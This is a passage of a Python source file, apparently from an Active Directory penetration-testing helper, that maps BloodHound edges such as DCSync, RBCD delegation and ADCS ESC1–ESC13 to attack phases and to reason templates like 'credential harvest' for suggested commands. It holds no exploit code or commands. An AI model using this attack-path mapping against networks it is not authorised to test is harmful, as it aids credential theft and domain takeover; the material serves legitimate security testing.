    "EnrollOnBehalfOf": "Request certificates impersonating other users",
    "ManageCA": "CA management for certificate manipulation",
    "ManageCertificates": "Approve/deny certificate requests",

    # Default
    None: "Potential attack vector identified",
}


# =============================================================================
# ACCESS TYPE -> PHASE MAPPING (for output grouping)
# =============================================================================

ACCESS_TYPE_PHASES = {
    # Quick Wins
    None: "Quick Wins",

    # Lateral Movement
    "AdminTo": "Lateral Movement",
    "CanRDP": "Lateral Movement",
    "CanPSRemote": "Lateral Movement",
    "ExecuteDCOM": "Lateral Movement",
    "HasSession": "Lateral Movement",
    "CoerceToTGT": "Lateral Movement",
    "HasSIDHistory": "Lateral Movement",
    "TrustedBy": "Lateral Movement",

    # Delegation (Lateral Movement)
    "AllowedToDelegate": "Lateral Movement",
    "AllowedToAct": "Lateral Movement",
    "AddAllowedToAct": "Lateral Movement",
    "WriteAccountRestrictions": "Lateral Movement",

    # Privilege Escalation
    "DCSync": "Privilege Escalation",
    "GenericAll": "Privilege Escalation",
    "GenericWrite": "Privilege Escalation",
    "WriteDacl": "Privilege Escalation",
    "WriteOwner": "Privilege Escalation",
    "ForceChangePassword": "Privilege Escalation",
    "AddMember": "Privilege Escalation",
    "ReadGMSAPassword": "Privilege Escalation",
    "ReadLAPSPassword": "Privilege Escalation",
    "SyncLAPSPassword": "Privilege Escalation",
    "AddKeyCredentialLink": "Privilege Escalation",
    "WriteSPN": "Privilege Escalation",
    "Owns": "Privilege Escalation",

    # ADCS (Privilege Escalation)
    "ADCSESC1": "Privilege Escalation",
    "ADCSESC3": "Privilege Escalation",
    "ADCSESC4": "Privilege Escalation",
    "ADCSESC5": "Privilege Escalation",
    "ADCSESC6a": "Privilege Escalation",
    "ADCSESC6b": "Privilege Escalation",
    "ADCSESC7": "Privilege Escalation",
    "ADCSESC9a": "Privilege Escalation",
    "ADCSESC9b": "Privilege Escalation",
    "ADCSESC10a": "Privilege Escalation",
    "ADCSESC10b": "Privilege Escalation",
    "ADCSESC13": "Privilege Escalation",
    "GoldenCert": "Privilege Escalation",
    "Enroll": "Privilege Escalation",
    "EnrollOnBehalfOf": "Privilege Escalation",
    "ManageCA": "Privilege Escalation",
    "ManageCertificates": "Privilege Escalation",
}


# =============================================================================
# ACCESS TYPE -> REASON TEMPLATES (for command suggestion justification)
# =============================================================================

# Templates use {user} and {target} placeholders for dynamic reason generation
ACCESS_TYPE_REASONS: Dict[Optional[str], str] = {
    # Lateral Movement reasons
    "AdminTo": "{user} has local admin rights on {target}",
    "CanRDP": "{user} has RDP access to {target}",
    "CanPSRemote": "{user} has PSRemote/WinRM access to {target}",
    "ExecuteDCOM": "{user} can execute DCOM on {target}",
    "HasSession": "Privileged session active on {target} - credential harvest",
    "CoerceToTGT": "{user} can coerce {target} auth to capture TGT",
    "HasSIDHistory": "{user} has SID history granting access to {target}",
    "TrustedBy": "{target} trusts {user}'s domain",

    # Delegation reasons
    "AllowedToDelegate": "{user} has constrained delegation to {target}",
    "AllowedToAct": "{user} can impersonate users to {target} via RBCD",
    "AddAllowedToAct": "{user} can add RBCD principals to {target}",
    "WriteAccountRestrictions": "{user} can configure RBCD on {target}",

    # Privilege Escalation reasons
    "DCSync": "{user} has DCSync rights (GetChanges+GetChangesAll)",
    "GenericAll": "{user} has GenericAll over {target}",
    "GenericWrite": "{user} has GenericWrite on {target}",
    "WriteDacl": "{user} can modify DACL on {target}",
    "WriteOwner": "{user} can take ownership of {target}",
    "ForceChangePassword": "{user} can reset password for {target}",
    "AddMember": "{user} can add members to {target}",
    "ReadGMSAPassword": "{user} can read gMSA password for {target}",
    "ReadLAPSPassword": "{user} can read LAPS password on {target}",
    "SyncLAPSPassword": "{user} has domain-wide LAPS sync rights",
    "AddKeyCredentialLink": "{user} can add shadow credentials to {target}",
    "WriteSPN": "{user} can add SPN to {target} for targeted Kerberoasting",
    "Owns": "{user} owns {target} - full control",

    # ADCS reasons
    "ADCSESC1": "{user} can request cert as any user via {target}",
    "ADCSESC3": "{user} can enroll on behalf of others via {target}",
    "ADCSESC4": "{user} can modify template {target} for ESC1",
    "ADCSESC5": "{user} can modify PKI object {target}",
    "ADCSESC6a": "{user} can exploit EDITF_ATTRIBUTESUBJECTALTNAME2 on {target}",
    "ADCSESC6b": "{user} can bypass issuance requirements on {target}",
    "ADCSESC7": "{user} can manage CA {target} - approve pending requests",
    "ADCSESC9a": "{user} can exploit no security extension on {target}",
    "ADCSESC9b": "{user} can exploit weak certificate mapping on {target}",
    "ADCSESC10a": "{user} can exploit weak cert binding on {target}",
    "ADCSESC10b": "{user} can add shadow credentials via {target}",
    "ADCSESC13": "{user} can exploit OID group link on {target}",
    "GoldenCert": "CA {target} key compromised - forge any certificate",
    "Enroll": "{user} can enroll in template {target}",
    "EnrollOnBehalfOf": "{user} can enroll certificates on behalf of others",
    "ManageCA": "{user} can manage CA {target}",
    "ManageCertificates": "{user} can approve certificate requests on {target}",

    # Quick Wins - no access_type (None)
    None: "",  # Will use context-based reason instead
}


def get_reason(
    access_type: Optional[str],
    user: str,
    target: str,
    context: str = ""
) -> str:
    """
    Generate human-readable reason for command suggestion.

    Args:
        access_type: BloodHound edge type (AdminTo, CanRDP, etc.)
        user: User principal with access
        target: Target computer or user
        context: Additional context from query mapping

    Returns:
        Human-readable reason string
    """
    # Try access_type template first
    template = ACCESS_TYPE_REASONS.get(access_type, "")

    if template:
        # Format with user/target, handling missing values
        user_short = extract_username(user) if user else "User"
        target_short = target.split(".")[0] if target else "target"
        return template.format(user=user_short, target=target_short)

    # Fall back to context if no access_type reason
    if context:
        return context

    # Generic fallback
    if access_type:
        return f"{access_type} relationship"

    return "BloodHound finding"
